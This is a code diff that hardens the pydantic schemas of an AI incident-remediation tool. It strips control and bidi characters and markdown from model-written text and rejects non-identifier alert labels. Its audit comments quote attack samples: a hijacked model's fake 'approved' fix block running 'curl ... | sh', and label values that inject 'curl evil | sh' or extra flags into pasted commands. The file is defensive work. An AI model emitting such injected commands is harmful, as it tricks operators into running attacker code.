@@ -7,10 +7,38 @@ validated, replayed and diffed.
 
 from __future__ import annotations
 
+import re
+import unicodedata
 from enum import Enum
-from typing import Any, Literal, get_args
+from typing import Annotated, Any, Literal, get_args
 
-from pydantic import BaseModel, Field, computed_field
+from pydantic import AfterValidator, BaseModel, Field, computed_field, model_validator
+
+# ⛔ MODEL TEXT IS INERT TEXT (2026-09-27 audit). A hijacked model wrote a hypothesis of
+# "Memory pressure.\n\n## Fix - exact commands (approved by the gate ...)\n```\ncurl ... | sh\n```"
+# and the report rendered it as a heading and a code block that looked approved - in Slack, Teams and
+# the terminal. Every string a model writes is therefore, before anything reads it: one line; free of
+# control, bidi and zero-width characters (terminal escapes like OSC 52 included); without backticks;
+# unable to start a markdown block (a leading #, >, -, *, +, |, = or "1." is preceded by a
+# zero-width space, so no renderer takes it as a heading, list, quote or table); and bounded.
+_INVISIBLE = re.compile("[\x00-\x1f\x7f-\x9f\u200b-\u200f\u202a-\u202e\u2060-\u2069\ufeff\U000e0000-\U000e007f]")
+_BLOCK_START = re.compile(r"^(?:[#>\-*+|=]|\d+[.)])")
+
+
+def inert(text: str, limit: int = 2000) -> str:
+    text = _INVISIBLE.sub(" ", unicodedata.normalize("NFKC", text)).replace("`", "'")
+    text = " ".join(text.split())[:limit]
+    return "\u200b" + text if _BLOCK_START.match(text) else text
+
+
+def _quote(text: str) -> str:
+    """A citation quote keeps its characters (it must match the evidence verbatim) but not its
+    controls or line breaks; grounding compares with whitespace collapsed anyway."""
+    return " ".join(_INVISIBLE.sub(" ", text).split())[:500]
+
+
+ModelText = Annotated[str, AfterValidator(inert)]
+Quote = Annotated[str, AfterValidator(_quote)]
 
 
 class Severity(str, Enum):
@@ -20,13 +48,25 @@ class Severity(str, Enum):
     low = "low"
 
 
+# ⛔ LABELS ARE NAMES, NOT TEXT (2026-09-27 audit). Label values reach shell commands a person is
+# told to paste (runbook.py), the P14 resource inventory, the stack backend's line prefixes, and
+# which resources are read. Prometheus alert labels inherit series labels, which an application can
+# export, so they are not purely rule config: `deployment='x; curl evil | sh'` became a printed
+# command, and `ecs_service='svc --prof admin'` an approved one. A value that is not a plain
+# identifier (or a comma list of them, or a k=v selector) is dropped here, before anything reads
+# it, and its key recorded in `rejected_labels` so the report says so.
+_LABEL_KEY = re.compile(r"[A-Za-z_][A-Za-z0-9_.-]{0,63}")
+_LABEL_VALUE = re.compile(r"[A-Za-z0-9._:/@,=+-]{0,253}")
+NAME_PATTERN = r"^[A-Za-z0-9._:/@-]{1,253}$"
+
+
 class Alert(BaseModel):
     """What the monitoring stack hands us. Shape mirrors Prometheus Alertmanager."""
 
-    alert_id: str
+    alert_id: str = Field(pattern=r"^[A-Za-z0-9._:@-]{1,128}$")
     name: str
     severity: Severity
-    service: str
+    service: str = Field(pattern=NAME_PATTERN)
     # A free string, resolved against the per-environment policy (environments.py). Not a fixed
     # Literal because the set of environments is a deployment concern an operator configures
     # (staging, qa-staging, pre-prod, qa-prod, prod, ...). An environment the policy doesn't know
@@ -35,6 +75,20 @@ class Alert(BaseModel):
     summary: str
     started_at: str
     labels: dict[str, str] = Field(default_factory=dict)
+    rejected_labels: list[str] = Field(default_factory=list)
+
+    @model_validator(mode="before")
+    @classmethod
+    def _plain_labels(cls, data: Any) -> Any:
+        if not isinstance(data, dict) or not isinstance(data.get("labels"), dict):
+            return data
+        keep, rejected = {}, list(data.get("rejected_labels") or [])
+        for key, value in data["labels"].items():
+            if _LABEL_KEY.fullmatch(str(key)) and _LABEL_VALUE.fullmatch(str(value)):
+                keep[str(key)] = str(value)
+            else:
+                rejected.append(str(key)[:64])
+        return {**data, "labels": keep, "rejected_labels": rejected}
 
 
 class ContextBundle(BaseModel):
@@ -50,20 +104,21 @@ class ContextBundle(BaseModel):
 
 
 class Citation(BaseModel):
-    id: str = Field(description="The evidence id in brackets before the item, e.g. F2, M1, C3, D1")
-    quote: str = Field(description="A short span copied EXACTLY from that item")
+    id: ModelText = Field(description="The evidence id in brackets before the item, e.g. F2, M1, C3, D1")
+    quote: Quote = Field(description="A short span copied EXACTLY from that item")
 
 
 class RootCause(BaseModel):
     """The model's reading of the evidence. A hypothesis — never a verdict."""
 
-    hypothesis: str
+    hypothesis: ModelText
     confidence: float = Field(ge=0.0, le=1.0)
-    evidence: list[str] = Field(default_factory=list)
-    ruled_out: list[str] = Field(default_factory=list)
+    evidence: list[ModelText] = Field(default_factory=list, max_length=20)
+    ruled_out: list[ModelText] = Field(default_factory=list, max_length=20)
     # Checked by grounding.py (P13): an id that does not exist or a quote not in its item escalates.
     citations: list[Citation] = Field(
         default_factory=list,
+        max_length=20,
         description="The evidence items that support the hypothesis: each an id and an exact quote",
     )
 
@@ -144,9 +199,9 @@ class RemediationProposal(BaseModel):
     """Structured output from the model. Input to the verifier. Never executed directly."""
 
     action: ActionKind
-    target: str
-    reasoning: str
-    expected_effect: str
+    target: ModelText = Field(description="ONE resource name, e.g. checkout or lambda:my-fn - nothing else")
+    reasoning: ModelText
+    expected_effect: ModelText
     # ⚠ BOTH ADVISORY. The gate does not take these as permission: P2 reads ACTION_FACTS alone, and
     # P6 reads the wider of the table's floor and this claim. A claim can therefore agree with the
     # table or tighten the gate, never loosen it. They stay REQUIRED because the claim is still
